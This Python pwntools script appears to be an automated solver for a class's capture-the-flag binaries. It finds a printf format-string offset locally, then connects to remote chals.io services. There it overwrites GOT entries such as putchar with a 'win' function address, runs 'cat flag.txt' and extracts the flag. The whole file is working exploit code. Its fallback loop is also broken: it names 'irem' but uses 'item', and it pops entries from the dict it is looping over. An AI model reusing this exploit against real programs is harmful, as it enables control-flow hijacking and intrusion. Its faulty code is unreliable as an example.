from pwn import *
context.clear(arch = 'amd64')
#All of the binaries in the class seem to put a putchar call in front of the printf, but just to be safe, I do have it set it up to cycle through all the other GOT entries if it fails. 

def exploit(binary):
    #Finding the offset index, copied from the write_var module.
    i = 1
    #Note: I could do this all in one local connection with a %p%p... type payload, but I think this is slightly safer if my write length is low.
    #We still might want to adjust depending on optimization concerns.
    while True:
        p = process(binary)
        
        payload = ('%'+str(i) + '$p').encode('ascii')
        p.sendline(payload)
        try:
            p.recvuntil(b'0x')
            leak = p.recvline().decode('ascii')
            if payload in p64(int(leak, 16)):
                print('index found: ', str(i))
                index = i
                break
        except:
            pass
        i += 1
        p.close()
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)

    e = ELF(binary)
    got_entries = e.got
    #Getting rid of entries that won't work for sure:
    got_entries.pop('__libc_start_main')
    got_entries.pop('__gmon_start__')
    got_entries.pop('stdout')
    got_entries.pop('stdin')
    got_entries.pop('stderr')
    #Maybe there's a more efficient way to code this, oh well.
    if 'putchar' in got_entries:
        payload = fmtstr_payload(index, {got_entries.pop('putchar'): e.sym['win']}, 0)
    
        p.sendline(payload)

        try: # Do we have a shell?
            p.sendline(b'cat flag.txt')
        except: # Probably just printed the flag
            pass

        output = p.recvall(timeout=0.2)
        print(b'output:', output)
        #added encoding unicode_escape to stop it freaking out about non-standard bytes.
        flag = re.findall(flag_regex, output.decode('unicode_escape'))
        
        if flag: # Success
            #print('putchar')
            return flag[0] #I'm going to loop through the other GOT entries just in case.
       
    for irem in got_entries:
        payload = fmtstr_payload(index, {got_entries.pop(item): e.sym['win']}, 0)
    
        p.sendline(payload)

        try: # Do we have a shell?
            p.sendline(b'cat flag.txt')
        except: # Probably just printed the flag
            pass

        output = p.recvall(timeout=0.2)
        print(b'output:', output)
        #added encoding unicode_escape to stop it freaking out about non-standard bytes.
        flag = re.findall(flag_regex, output.decode('unicode_escape'))
        print(flag)
        if flag: # Success
            print(item)
            return flag[0]
    return

